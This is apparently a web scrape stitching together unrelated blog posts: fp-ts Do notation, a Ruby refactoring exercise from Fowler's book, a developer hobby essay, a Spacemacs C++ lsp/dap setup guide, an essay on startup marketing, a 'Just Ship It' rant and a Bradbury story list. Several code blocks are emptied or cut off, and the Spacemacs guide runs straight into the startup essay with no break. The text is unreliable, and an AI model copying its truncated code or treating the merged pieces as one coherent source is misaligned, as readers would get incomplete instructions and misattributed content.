    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span></code></pre>
      </div><p>At each <code>bind</code> step, we're passing an identifier, and an <code>Option&lt;number&gt;</code> value. Each step will only continue on if the previous value was present. Finally, the last return statement, the provided values at <code>a</code>, <code>b</code>, and <code>c</code>, are each <code>number</code>s. The function here can be used to transform the result value. Remember, each step only gets invoked if all of the previous options were defined. For example, let's say that <code>maybeA</code>'s  value was <code>some(5)</code>, <code>maybeB</code>'s value was <code>none</code>, and <code>maybeC</code>'s value was <code>some(6)</code>. The <code>Do</code> chain would stop at the second step, and the result of the entire <code>Do</code> expression would be <code>none</code>.</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>

result </code></pre>
      </div><p>If all of the values were defined, then we'd reach the <code>return</code>, and the result of the expression would be <code>some(sum)</code>, where <code>sum</code> is the value returned by the <code>return</code> function:</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>

result </code></pre>
      </div><h3 id="do-for-either"><a href="#do-for-either">Do for Either</a></h3><p>When using <code>Do</code> with <code>Either</code> values it behaves similarly to <code>Option</code>. Each step will only continue if the value it encounters is a <code>right</code> value.

      </div><p>The <code>Do</code> function takes an instance of a Monad typeclass, which handles the chaining of the values that you pass as the second parameter to <code>bind</code>. The type of the typeclass instance also determines the <em>type</em> of values you will be able to chain. For instance, <code>Do(option)</code> will enable you to chain <code>Option</code> values (since <code>option</code>'s type is <code>Monad1&lt;"Option"&gt;</code>'). <code>Do(either)</code> will enable you to chain <code>Either</code> values (since <code>either</code>'s type is <code>Monad2&lt;"Either"&gt;</code>). The value returned from <code>Do</code> is a builder that will let you create chains of these monads.</p><h2 id="bind"><a href="#bind">.bind</a></h2><p><code>.bind</code> takes a <code>string</code> identifier, and an instance of the contextual monad.

Note that in the <code>return</code> function, <code>context.user</code>'s and <code>context.manager</code>'s types are <code>User</code>, not <code>Option&lt;User&gt;</code>. <code>bind</code> "extracts" the values for us, in the same way that <code>async</code> "extracts" the value out of a promise.</p><div data-language="ts">

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>June 30, 2020<!-- --> <!-- -->•<!-- --> <span>programming</span></p></header><section><p>I picked up <a href="https://martinfowler.com/books/refactoring.html">Refactoring, by Martin Fowler</a>, and I am learning a lot. The book is written like a catalogue that you can refer back to later. And, for those who are seeking, <strong>the book is an excellent chance to get your code reviewed by Martin Fowler!!</strong> 😮</p>
<p>Martin starts the book with an example that he goes on to refactor in the first chapter. Sensing an insane opportunity, I stopped right away and copied this original code in Ruby. I then went ahead, wrote down my thoughts and refactored the code like I would if it was an actual thing I was working on. Once I was done, I went back to the book and compared Martin’s notes against mine, and learnt from his thought process and code. I think this is the best way to read this chapter.</p>
<p>If you are someone who enjoys this, I highly recommend you give this a try too. And if not the book, use this blog to power your review.</p>

<p><strong><em>(Psssst… You can find the full original code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/original">Github</a>)</em></strong></p>
<p>We have a Theatre Company that perform plays in events. They charge customers based on the type of the play, and also provide a “Volume Credit” for future discounts. The Company stores data about their plays (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/plays.json">plays.json</a>) and bills (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/invoices.json">invoices.json</a>) in JSON files.</p>
<p>The simple code below is used to print a bill from an invoice. This is the code we will attempt to refactor. Assume that this code is part of a much larger system and we are refactoring while adding a feature to print bills in HTML. Moreover, the Company has plans to perform more types of plays in the future.</p>

<p><strong><em>(Psssst… You can find the refactored code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/ketanbhatt">Github</a>)</em></strong></p>
<p>Reading through the code, this is what stood out for me:</p>
<ol>
<li>The <code>statement</code> method returns a formatted text right now. I would like it to return a structured statement that I can format later as I wish, for example: for sending Slack notifications, emails. Additionally, it simplifies writing tests for this and the formatter methods.</li>
<li>The code that adds extra <code>volume_credits</code> for <code>comedy</code> plays, the comment states that we add extra credit for every “10” attendees, but the code adds a credit for every “5” attendees. Either this comment has gone stale, or there is a bug in the code. Either way, we can make the code more readable and remove the comment. (Aside: I like <a href="http://antirez.com/news/124">antirez’s blog about writing comments</a> a lot.)</li>
<li>Overall, it is difficult to understand what is going on in the code. I think we can make it more readable easily.</li>
<li>The method is doing too much, calculating <code>volume_credit</code> and <code>amount</code> for each type of play, and creating the text. It would be better if I can hand over this calculation to a different class that would do the needful, and my method just creates the text.</li>
<li>Because of this “doing too much”, the code has become messy. It will become still messier if the calculation was different for each Play too (and not same for Plays of the same type).</li>
<li>Also, looks like that the calculation is in cents and is being converted to dollars in the text. The code should make this explicit. Maybe I could rename the variable to be <code>amount_in_cents</code>?</li>
<li>The code right now assumes <code>audience</code> to be present and to be a number. Maybe we should put in validations that <code>asserts</code> for this truth? Although it seems out of scope for our current exercise.</li>
</ol>

<p>I moved the code for calculating amount and volume credits to a different class and file. I also separated the calculation for the two types of plays.</p>
<p>In the future, adding new play types will just need a new class to be added.</p>

<br>
I also implemented the calculation in a more verbose manner. I think this improves the readability of the code.

I will call the refactoring done at this point.
<div><p>Although, I can’t seem to shake off this feeling that there is something more that can be done. I don’t think I am completely happy with the changes 😕 Let’s see what Sir Martin has to say.
</p></div>

</center>

<p>The process that Martin followed for refactoring the original code, in his words, was:</p>
<blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p id="794f">As software developers, we are a fairly unique group. For many of us, our profession is also our hobby. On the surface this is great:</p><blockquote><p id="4d9e">“Find a job you enjoy doing, and you will never have to work a day in your life.”</p><p id="8b67">― Mark Twain</p></blockquote><p id="e093">However, in reality, the inspiration for new ideas usually comes up as a side-effect of the things you do in your spare time. Needless to say, that when you program in your spare time as well as your day job, most of your ideas are about “products” aimed at other software developers.</p><p id="1a04">This gave birth to many amazing open-source projects, commercial products, as well as small and large companies built around those products.</p><p id="ff7f">Over my own career I’ve made quite a few products like that: in 2002-2003 I’ve created <a href="https://web.archive.org/web/20070430180014/http://www.spaweditor.com/en/disp.php/en_products/en_spaw/en_spaw_intro" target="_blank" rel="noopener">SPAW Editor</a> so developers can add a WYSIWYG editor to their web apps, in 2011 I started <a href="https://adduplex.com/" target="_blank" rel="noopener">AdDuplex</a> so developers can cross-promote their Windows apps, and in 2018 I made <a href="https://markerjs.com/" target="_blank" rel="noopener">marker.js</a> so developers can implement image annotation. And there were a lot of similar products and projects in-between.</p><p id="cd00">As time passed, though, from-developers-for-developers space got very well saturated. For every noun you can think of there’s a JavasScript library with that name. For every task you want to automate in your development process someone already made a tool. You are often lead (by your own [lack of] imagination) to creating an alternative for something that already exists with only marginal improvement in performance or a slightly nicer API.</p><p id="c2e9">This may be fine for those 10x-alpha-developers, as by iterating on those marginal improvements they move our industry forward. But for us mere mortal developers with impostor syndromes based in reality, the hobbyist part of our dev life got much harder. At least for me personally, coming up with useful ideas for the for-developers projects got infinitely more difficult.</p><h2 id="dceb">Enter out-of-left-field hobby</h2><p id="2b39">Earlier this year I took on an old-new hobby —learning and making music. (Check out my <a href="https://medium.com/renoob" target="_blank" rel="noopener">music-making blog here</a>). Among other reasons, one reason for doing this was to take me out of the development rut which was affecting my day job performance and overall mood.</p><figure><div><div><div><div><p><img src="https://miro.medium.com/max/60/0*8viKF9LdnaAf6izD.png?q=20" width="1879" height="479" role="presentation"></p><p><img src="https://miro.medium.com/max/3758/0*8viKF9LdnaAf6izD.png" width="1879" height="479" srcset="https://miro.medium.com/max/552/0*8viKF9LdnaAf6izD.png 276w, https://miro.medium.com/max/1000/0*8viKF9LdnaAf6izD.png 500w" sizes="500px" role="presentation"></p></div></div></div></div></figure><p id="cd61">In just a month since I started <a href="https://medium.com/renoob/the-ultimate-guide-to-learning-music-theory-32dd61048758" target="_blank" rel="noopener">learning music theory</a> I realized that many of the great music educators use very sub-optimal tools to show musical concepts on the piano. This led me to developing <a href="https://pianoshow.me/" target="_blank" rel="noopener">PianoShow.me</a> and, as a side-effect, <a href="https://github.com/ailon/piano-chart" target="_blank" rel="noopener">Piano Chart</a> (yes, a for-developers OSS project).</p><figure><div><div><div><div><p><img src="https://miro.medium.com/max/60/1*zmvjpAez93vzyxIvjbn90g.png?q=20" width="1920" height="1080" role="presentation"></p><p><img src="https://miro.medium.com/max/3840/1*zmvjpAez93vzyxIvjbn90g.png" width="1920" height="1080" srcset="https://miro.medium.com/max/552/1*zmvjpAez93vzyxIvjbn90g.png 276w, https://miro.medium.com/max/1000/1*zmvjpAez93vzyxIvjbn90g.png 500w" sizes="500px" role="presentation"></p></div></div></div></div></figure><p id="a499">About two months in, I started releasing <a href="https://open.spotify.com/artist/0MgRs7qoT2SNFfe8ST1sX6?si=VsNK8_pmSdOhyjqINQDOTQ" target="_blank" rel="noopener">my musical experiments</a> on streaming services through a popular distributor <a href="https://distrokid.com/vip/seven/1828958" target="_blank" rel="noopener">DistroKid</a>. Once my “massive” earnings started pouring in, I noticed that there was no easy way to visualize and analyze that revenue data and it led me to creating <a href="https://distrolytics.com/" target="_blank" rel="noopener">Distrolytics.com</a>.</p><p id="b1e1">In both cases the ideas came naturally out of problems I saw in my non-programming hobby and, since other people encountering them are not programmers for the most part, no one has solved them yet.</p><p id="0ae4">This made me realize that while I love software development, in this day and age it is much easier to come up with new and unique(ish) software project ideas that are not in the for-developers space. You just need to get involved in those other areas on a deeper lever and unsolved obvious problems just start jumping out at you.</p><h2 id="049c">What about you?</h2><p id="9b46">What is your hobby?

July 1, 2020 | https://skebanga.github.io/cpp-dev-in-spacemacs/ | <a href="https://web.archive.org/web/*/https://skebanga.github.io/cpp-dev-in-spacemacs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Two new emacs packages, <a href="https://github.com/emacs-lsp/lsp-mode">‘lsp-mode’</a> and <a href="https://github.com/emacs-lsp/dap-mode">‘dap-mode’</a>, have 
brought the power of Microsoft’s <a href="ttps://github.com/Microsoft/language-server-protocol/">Language Server Protocol</a> and <a href="https://microsoft.github.io/debug-adapter-protocol/">Debug Adapter Protocol</a>
to emacs.</p>

<p>This is a guide to getting <code>lsp-mode</code> and <code>dap-mode</code> working in spacemacs for C++.</p>

<p>Spacemacs’ <a href="https://develop.spacemacs.org/layers/+lang/c-c++/README.html">C++ layer</a> supports multiple backends for <code>lsp-mode</code>. We’ll be using 
<a href="https://clangd.llvm.org/">clangd</a>, a language server built on clang.</p>

<p>The distro I use in this post is Ubuntu 20.04.</p>

<p><em>Disclaimer</em></p>

<p>I wrote this <em>after</em> figuring out how to configure everything, so it’s highly likely I’ve forgotten something or missed a step. Please let me know if this doesn’t work for you.</p>

<h2 id="dependencies">Dependencies</h2>

<h3 id="clang-tools">clang tools</h3>

<p>We will be installing our clang tools from the Ubuntu nightly repos provided by llvm.</p>

<p>Add the gpg key and repository config to apt:</p>

<div><div><pre><code>$ wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add -
$ sudo add-apt-repository "deb http://apt.llvm.org/focal/ llvm-toolchain-focal main"
$ sudo apt update
</code></pre></div></div>

<p>Install the clang tools</p>

<div><div><pre><code>$ sudo apt install -y clang-format clang-tidy clang clangd libclang-dev liblldb-11-dev lldb
</code></pre></div></div>

<h3 id="node">node</h3>

<p><code>dap-mode</code> leverages the vscode debug adapters which are written in javascript. As such we need to install node</p>

<div><div><pre><code>$ sudo apt install nodejs
</code></pre></div></div>

<h2 id="lsp-mode"><code>lsp-mode</code></h2>

<p><code>lsp-mode</code> will run <code>clangd</code> and communicate with it in order to get information about your C++ code.</p>

<p>You need to tell <code>clangd</code> where to find <a href="https://clang.llvm.org/docs/JSONCompilationDatabase.html"><code>compile_commands.json</code></a>, the 
compilation database which describes how your code is compiled, where to find includes etc.</p>

<p>You probably want to do this on a per-project basis, so that different projects with different settings don’t interfere with eachother.</p>

<p>In order to do this you need to add configuration for <code>lsp-clients-clangd-args</code> to your project’s <code>.dir-locals.el</code></p>

<div><div><pre><code>((c++-mode . ((lsp-clients-clangd-args . ("--compile-commands-dir=build"
                                          "--pch-storage=memory"
                                          "--background-index"
                                          "-j=4"
                                          ))
              )))
</code></pre></div></div>

<p>Here you can see that I’ve added a number of configuration arguments for clangd, the most important being <code>--compile-commands-dir</code>, here specified 
as a subdirectory <code>build</code>, which is relative to the source tree’s root dir.</p>

<p>The other options I’ve specified are performance related:</p>

<div><div><pre><code>--pch-storage=&lt;value&gt; - Storing PCHs in memory increases memory usages, but may improve performance
--background-index    - Index project code in the background and persist index on disk.
-j=&lt;uint&gt;             - Number of async workers used by clangd. Background index also uses this many workers.
</code></pre></div></div>

<h2 id="dap-mode"><code>dap-mode</code></h2>

<p>In order to communicate with gdb and/or lldb, we need to install the <a href="https://github.com/WebFreak001/code-debug">vscode debug adapter for gdb and lldb</a>.</p>



<h2 id="spacemacs-layers">spacemacs layers</h2>

<p>Now we need to configure the <code>lsp</code>, <code>dap</code> and <code>c-c++</code> layers in our spacemacs config.</p>

<div><div><pre><code>dotspacemacs-configuration-layers
'(
  ....
  (lsp :variables
       lsp-restart 'auto-restart) ; if the server exits, just restart it without prompting
  (dap :variables
       dap-enable-ui-controls nil ; don't display the mouse buttons 
       dap-auto-configure-features '(sessions locals breakpoints expressions tooltip)) ; use the auto-configure layout, but no mouse buttons
  (c-c++ :variables
         c-c++-backend 'lsp-clangd)
  ....
  )
</code></pre></div></div>

<h2 id="debugging-an-app">Debugging an app</h2>

<p>You can add debug configurations for individual apps to your project’s <code>.dir-locals-el</code> file</p>

<p>Here is an example:</p>

<div><div><pre><code>((c++-mode . ((dap-debug-template-configurations . (
                                                    ("my_app"
                                                    :type "gdb"
                                                    :target "/home/user/src/build/app/my_app"
                                                    )
                                                    )))))
</code></pre></div></div>

<p>With that added to your <code>.dir-locals.el</code> you can reload your project so that debug-template is added to <code>dap-mode</code>, and then start debugging:</p>

<div><div><pre><code>`SPC d b a`: adds a breakpoint at the current source line
`SPC d d d`: opens a list of debug-templates, select `my_app` and it should start
</code></pre></div></div>

<p>I was born and raised in the San Francisco Bay Area and grew up during the dot com boom in the late 1990s. One of the most interesting things in looking back are the stark differences in what it took to be successful back then with a software company and what it takes to be successful in building a software startup today in the US. </p>

<p>When I was a teenager, if you wanted to get into internet startups, you needed to find information on how to build websites. Although there were some no-code website builders, they were largely terrible. Building websites from scratch was the way to go. Moreover, developer knowledge was not really available online, because content on the internet was still being written. You had to hop over to your local Barnes &amp; Noble bookstore to buy books on HTML, Javascript, Perl and whatnot. Lastly and most importantly, you needed access to servers. It was not uncommon for internet companies to spend boatloads of money setting up their infrastructure in a closet at their office. Back then, technical knowledge was a really valuable and a limited skill. If you could assemble the best technical teams and keep them happy, that was a really strong moat for you because you could prevent other would-be competitors from being able to build a competing offer.</p>

<p>And as a result, for many years, there were not that many websites in the US market (or anywhere). If you had a website, it was relatively easy to capture attention and web traffic. One such website, Craigslist, a simple peer-to-peer marketplace site that we are all familiar with, was started in 1995 and continues to reign to this day despite so many upstarts trying to compete with it on better design and usability. Why? Craigslist gets the job done and more importantly, people know about its existence. Distribution is king.</p>



<p>Although it often took months to build out a website in the 90s, today you can often get a fairly straightforward site out the door even with no-code tools in less than a day. And if you do need to write code, you can search for code examples on just about every possible topic in a variety of discussion forums and on YouTube. Even more advanced computer science topics such as in machine learning now have so many open source resources and infrastructure.  You can often use a variety of specialty libraries without having specialized knowledge. For the most part, in software, technical information has largely become commoditized. This isn’t to say that you can’t make good money being a software engineer — and in fact, if you are a top engineer, you can now make a boatload of money! But it’s to say that most “run-of-the-mill” software development is not a unique skillset and most software businesses developed today don’t require specialized software development skills.</p>



<p>This has led to a flurry of many applications being built online – often with multiple teams building the same thing. It is not uncommon to run into 50 different founding teams all trying to build a marketplace for gym trainers. Or 300 founding teams trying re-invent marketing automation.</p>

<p>According to <a href="https://www.statista.com/chart/19058/how-many-websites-are-there/">Statista</a>, the number of websites has ballooned to nearly 2B!</p>



<p>For most software businesses in the US, the problem isn’t technical knowledge anymore. The problem is getting a wedge into distribution — also known as marketing. </p>



<p>Furthermore, incumbents who generally do a good job, often manage to continue reigning. According to Brad Gerstner, CEO of Altimeter Capital, who recently did a podcast on <em><a href="http://investorfieldguide.com/podcast/">Invest Like The Best</a></em>, large tech companies have managed to take even more market share than 10 years ago. Some people may argue this is because the large tech companies have improved their products over time to stay ahead due to their increased collection of data and better algorithms that feed on that data over time. That may be true for some companies but not all. This also applies to other products that have not made significant strides in their technology — Craigslist, Salesforce CRM, Turbotax, Quickbooks to name a few. Even Google Search which arguably had a better product in the 1990s compared to its peers is about on par with alternative search engines today, but 90% of people worldwide still use Google. Old habits die hard, and distribution matters more than ever if you are just starting a business. It’s hard to topple incumbents who have strong distribution and already large audiences — even if you can build a much better product. </p>



<p>So where are the opportunities in software? Is it even possible to build a company that takes an entire market?  I took to Twitter to find out. </p>

<p>A big warm thanks to everyone who participated. A number of people came up with some great suggestions of winner-take-all companies within a variety of developer tools / API markets, but in large part, this was an incredibly difficult challenge. No one could think of a company that has started in the last decade and has clearly dominated above all other competitors. On the flipside, we’ve already rattled off a number of older software companies that continue to dominate market share TO THIS DAY in a variety of areas: Google Search, Amazon Books, Turbotax, etc. This isn’t to say that you cannot build a big business if you don’t own a market, but it’s to say that the old way of thinking about market domination is just not applicable anymore.</p>



<p>Put another way, a lot of the “low hanging fruit” in the US software market is now gone. Software in the US generally works. And new opportunities get swept up with would-be competitors immediately. If the 90s was about thinking through your build, the 2020s is about thinking through marketing &amp; distribution. </p>



<p>As such, while many VCs are still fixated on finding unique technology in software and chasing companies that will ultimately be the sole winner, I’d contend that these two strategies — while successful in the 90s and early 00s — largely no longer work. There are certainly exceptions but if we are talking strictly about software, (not hardware, not drug discovery, not synthetic bio, etc) you’d be hard pressed to find a company where winning does not require a solid marketing and/or sales game. This is very different from the 1990s. Having a marketing skillset and mindset is what you need to win in 2020 in the US software market. </p>



<p>Although the low hanging fruit opportunities in the US are gone, it’s not to say that you can’t build a Salesforce competitor or a Craigslist competitor and be successful. The software market in the US has gotten so big — you can still build a billion dollar business if you are the 15th email service provider. We are seeing more and more unicorns ($1b valuation businesses) and many in the same market. However, we are also seeing many more startups than in the 1990s being built. This means that while there are more unicorns as an aggregate number, there are also many more companies that will not become unicorns. And with increased competition, even if there are more winners, the cost of customer acquisition becomes more expensive for all. </p>

<p>In fact, there are economic schools of thought around where we are in the tech-economic landscape. As economist Carlotta Perez describes, we are now in the <a href="http://www.carlotaperez.org/downloads/media/PEREZTechnologyandbubblesforEngelsbergseminar.pdf">Deployment Phase</a> of the internet in the US — meaning, we are in-process of exhausting all use cases for internet technologies in the US. What has traditionally happened at the end of a technology phase is oversaturation of investment dollars chasing smaller returns. Valuations go up, returns go down, and investors lose their money. (Sound familiar?) On a company level, what this means is, if not careful, a lot of companies will end up wasting marketing dollars in this type of landscape. Companies in the 2020s, unlike in the 1990s, need to really be performance-marketing driven in order to compete. The end of last year certainly showed us many examples of well-funded companies that could not make the unit economics work. The software industry has become a marketing game. </p>



<p>Even if you aren’t running a strictly software business but use software platforms to operate a business, marketing is still key. If you run your company off  Yelp, Shopify, Patreon, Stripe, Recurly, ConvertKit, Substack, or any of the others, you need to stand out, and that’s marketing. And the people who do the best at marketing make a LOT of money, and those who don’t, just can’t catch a break, even if they are good at their craft. Marketing is necessary.</p>



<p>There are, of course, exceptions to this — there are still emerging markets (both in the geographical sense and technology sense) where marketing doesn’t matter as much. </p>



<p>In developing geographical markets, it’s largely greenfield. We have a portfolio company in Indonesia that was able to get 250k signups almost immediately from brick and mortar small businesses and no budget. In the US, without a large marketing budget, this would be challenging to do now. Why? Because every Square and Opentable is knocking on their door and has been for years. There’s just so much noise small businesses tend to ignore. But in Indonesia, that isn’t the case…yet. The software landscape there is similar to the 1990s in the US. It’s harder to piggyback off of existing software infrastructure — whether it’s payments or platforms — but there’s also a lot of obvious opportunity in software that no one is going after. The same could be said about investing elsewhere in Southeast Asia or in LatAm or Africa. There are fewer startups to compete with for attention, and it’s less of a marketing game than building a software company in the US. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>I know, I know, by this point you want "Just Ship It" to be an actual person so you could punch it in the face. As an Indie Maker, that sentence can be super frustrating because it's tired, it's cliche, and your response is always "HEY! You don't understand... it's not that easy".  </p>&nbsp;<p>I agree, it's not easy, but it's always the right thing to do. </p>&nbsp;<p>Here's why.  </p>&nbsp;<p>I started building an app on 01.01.2018. It was New Year's Eve and we just had the crappiest night ever. Yes, imagine a night <em>so bad</em> that at midnight you decide "you know what, fuck it, I'm gonna work on WEB DEVELOPMENT".<br>That bad.  </p>&nbsp;<p>The MVP was ready in a few days. I'm not that good of a coder, it's just a simple app. The 0.0.1 alpha version was more than ready. I could've released it, share it with a couple of people, and call it a day. I could've done that with every single version that I made, at any point from 2018 until now. I just wanted to add one more thing. One more feature. Just this one more thing and people will like it. One more screen and everything is gonna make sense. I swear, just this one last thing and it's ready.  </p>&nbsp;<p>BAM, last moment decision from the world's biggest dumbass:
"People wouldn't use this if it doesn't have a proper native mobile app for it. Time to learn React Native and spend a few months on that 🤦️"   </p>&nbsp;<p>God, if time machines were real, past-Kitze would be shoved in a toilet so hard right now. </p>&nbsp;<p>After 2 years of development, juggling between the fucking horror that's the web platform, React Native, Expo, GraphQL, bitching about how there's no ideal tech stack, the good old jQuery and Filezilla days, switching to other projects, releasing <a href="https://sizzy.co/">other apps</a>, losing passion, finding passion, coming back to the app, etc. etc. etc...  </p>&nbsp;<p>I just dropped it.  </p>&nbsp;<p>I was still using it but I stopped developing it and just dropped the idea of releasing the app, ever.</p>&nbsp;<p>After a while, I was using it, but I realized that I'm missing a lot of features, so I'd either have to go back to developing it, or I'd have to find an alternative.   </p>&nbsp;<p>And boy did I find one.  </p>&nbsp;<p>I was scrolling their landing page and I was happy and furious at the same time. Someone solved the problem that I was solving. It was like someone literally read my mind and started coding. WHAT.  </p>&nbsp;<p>I have previously sent a video of my app to a couple of people (closest I came to shipping it) so I started getting suspicious if someone actually shared the video of my app with these people because they were solving literally the same problem, and they most of the features that I had.  </p>&nbsp;<p>I started getting this overwhelming happy, sad, and panicky feeling. I literally cannot explain how I felt while scrolling their page.</p>&nbsp;<p>One moment I am scrolling their list of features giggling like a little kid with a 48$ bill in a candy store (yea I know 48$ bills don't make sense, but JavaScript doesn't make sense and you're still using it), one moment I want to find these people and THROW THEM IN A PIT OF LIONS.   </p>&nbsp;<p>FUCK.    </p>&nbsp;<p>It's not their fault. I was just slow. I didn't ship on time. I'm gonna go ahead and tattoo "JUST SHIP IT" on my forehead. Nah I wouldn't be able to see it there. On my arm maybe. Nvm, let me go back to scrolling their landing page.  </p>&nbsp;<p>Fuck. They have solved everything that I wanted to solve, and WAY more. Hey, maybe I should be happy? I don't have to code anymore. Yay!? No more web platform? BLISS. Oh crap... the world is never gonna see my app though. But at least I don't have to see React Native anymore. NICE! Wait... BUT I WASTED SO MUCH TIME ON IT. FUCK.  A bunch of mixed feelings.  </p>&nbsp;<p>Here comes the saddest part, so grab a pack of tissues.   </p>&nbsp;<p>After a little bit of hesitation, I made an account. I watched the videos in their help center. Every time I caught myself smiling about a clever way they implemented something I slapped myself. NO. Bad Kitze. You shouldn't like this. THEY'RE COMPETITORS. <em>sigh</em> Sure buddy, whatever you tell yourself. Competitors to a shitty codebase sitting on your hard drive.  </p>&nbsp;<p>For 2 frickin' years, I thought it's too early to release my app because it's clunky, buggy, it's missing features, blah, blah, blah. No one would ever use it, right? I was so wrong.  </p>&nbsp;<p>I started using their app.  </p>&nbsp;<p>Even though they were working on it for the past few years it's still slow, buggy, and super unpolished, it doesn't matter, because they shipped.   </p>&nbsp;<p>Their mobile app is terrible and it needs 10 seconds to sync. It doesn't matter, they shipped. And I'm looking forward to every single update they release.</p>&nbsp;<p>Their backlog of things to do is huge, but it doesn't matter, they ship every single week, and the app is growing along with the community.  </p>&nbsp;<p>"But Kitze, even though tHeY sHiPpEd no one would pay for something unpolished and broken, right?"  </p>&nbsp;<p>Oh, Indie Hackers. So clever, yet so naive.  </p>&nbsp;<p>Today my 30-day trial has expired. A tear rolled down my cheek for every single digit of my credit card that I entered in their app. I am officially not only a subscriber, but also a fan. Every time I'll get a payment notification it's gonna feel like stepping on a lego ... glued to a knife. My bank might as well change the notification from "You have paid 5$ to ThatCompany" to "You never shipped, loser".   </p>&nbsp;<p>My app is officially dead.  </p>&nbsp;<p>99% of you are in the same boat right now, but hopefully just a few weeks into your project. Don't be a dumbass like me. Take a breath, roll your eyes at the cliche saying, but please...  </p>&nbsp;<p>Just Ship It.  </p>&nbsp;<p>P.S I would totally release and show you my app but ... it's not ready yet.  </p>&nbsp;</div></div></div></div>]]>

</div></div><div data-block-type="2" id="block-32e240a0acc2fe970f20"><div><p>When the first edition of <em>Listen to the Echoes: The Ray Bradbury Interviews </em>was published in June of 2010, I embarked upon an overly-ambitious project. I began a series on my blog titled “The Essential Bradbury,” where I intended on listing the 25 must-read Ray Bradbury short stories for any would-be Martian-neophytes. I listed out each story, its history, themes, and what made the tale top-shelf Bradbury. Over the next few years, I made it all the way to 18 stories! But, then, the old web site came down as <a href="https://hatandbeard.com/products/listen-to-the-echoes-the-ray-bradbury-interviews"><em>Listen to the Echoes</em></a> was published in a handsome new edition by a new publisher and, alas, I never completed the 25 “Essential Bradbury” stories.</p><p>So here I go again! Fans have been writing me, asking if I would re-post the old story suggestions and, at long last, finish the project. And so it begins. I figure I only have seven more stories to write about! I have reordered many of my choices. I will be counting down from 25 to number 1 over the next few weeks. </p><p>People often ask, "where should I begin when it comes to reading Bradbury?"</p><p>The long answer? In 2010, Everyman's Library republished <a href="https://www.amazon.com/Stories-Bradbury-Everymans-Contemporary-Classics/dp/0307269051/ref=sr_1_1?ie=UTF8&amp;qid=1543608624&amp;sr=8-1&amp;keywords=the+stories+of+ray+bradbury"><em>The Stories of Ray Bradbury</em></a><em> </em>containing a staggering 100 of Bradbury's best short stories. Along with this, there is the equally voluminous <a href="https://www.amazon.com/Bradbury-Stories-Most-Celebrated-Tales/dp/0060544880/ref=sr_1_1?ie=UTF8&amp;qid=1543608705&amp;sr=8-1&amp;keywords=bradbury+stories"><em>Bradbury Stories</em></a>, published in 2003, containing&nbsp;yet another 100 more short fictional gems. (Bradbury dedicated this last book, in part to me, an incredible, stirring gift.) Certainly, you cannot go wrong by reading either of these spectacular volumes. Bradbury is a master of the short story.&nbsp; It is, in my estimation, his strongest creative form. His wife of 56 years, Marguerite, agreed with me. Yet reading 200 stories is, for many, an unrealistic goal.</p><div><p>So the short answer of where to begin with Bradbury is this list, right here. I will offer up a streamlined list of 25 of my own personal favorite short fictions by the master of miracles. These stories will embody all the trademarks of vintage Bradbury: the lyrical language; the fantastic, original, and memorable ideas; the rich metaphor; and endings that sometimes surprise, sometimes sadden, always instruct and entertain. This list will be entirely subjective. These are my favorites. They will reflect a wide range, from weird tales to social science fiction to quiet and contemplative tales of contemporary literature. These tales are pure and classic Bradbury—our modern mythologist.</p><p><strong>#25 “THE FIRST NIGHT OF LENT”</strong></p></div><p><span>Where to Find It</span>: <em>A Medicine for Melancholy,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: <em>Playboy, March, 1956</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550443716450_14171"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550443716450_17081"><div><p><span>Plot Synopsis</span>: A young screenwriter at work in Ireland in 1953 discovers that his ever-reliable regular taxicab driver has become dangerous and impaired when behind the wheel. Nick, the village driver, escorts the young writer from Dublin to the Irish countryside and the estate of the young screenwriter’s director. Nick then waits at the local pub until the writer is ready to be driven back to the city. There is never a problem, until the first night of Lent. . . .</p><p><span>Critique</span>: Any “essential” list of Bradbury short stories must include an Irish tale (as well as a Mexico story, a Mars story, and a Green Town story, for that matter). The problem is, of course, <em>which</em> Irish story? I choose this one for two simple reasons. First, Bradbury takes the lyrical quality of his voice and drenches it in a poetic and authentic Irish brogue.</p><p><em>Nick, now</em>. <em>See his easy hands loving the wheel in a slow clocklike turning as soft and silent as winter constellations snow down the sky. Listen to his mist-breathing voice all night-quiet as he charms the road, his foot a tenderly benevolent pat on the whispering accelerator, never a mile under thirty, never two miles over. Nick, Nick and his steady boat gentling a mild sweet lake where all Time slumbers. Look, compare. And bind such a man to you with summer grasses, gift him with silver, shake his hand warmly at each journey’s end</em></p><p><em>“Good night, Nick,” I said at the hotel. “See you tomorrow.”</em></p><p><em>“God willing,” whispered Nick</em></p><p><em>And he drove softly away.</em></p><p>The second reason I have selected this story for “The Essential Bradbury” list is that this is the first Irish story Bradbury wrote. It is his first creation, fresh-removed and newly-minted from his own actual experiences of living in Dublin in the autumn of 1953 and the winter of 1954, writing the screenplay for <em>Moby Dick</em> for film director John Huston. From a biographical standpoint, it is fascinating to read a work of short fiction that is, ostensibly, memoir. And with “The First Night of Lent,” Bradbury had discovered a trove of material that would continue to yield rich story, culminating in the publication of the 1992 semi-autobiographical novel, <em>Green Shadow, White Whale</em>, a minor-class</p><p><span>The Beginning of the Irish Stories</span>: As Ray recalled, one night after he had returned from Ireland, he was in bed and a voice spoke to him</p><p>“Ray, darling!”</p><p>Ray responded, “Who is it?” </p><p>And the voice said, “It’s Nick, the cab driver who drove you back and forth from Dublin to Kilcock 80 or 90 times. Do you remember that, Ray? Do you?” </p><p>And Ray said, “Yes?”</p><p>And the voice said, “Would you mind puttin’ it down?” </p><p>So Ray Bradbury 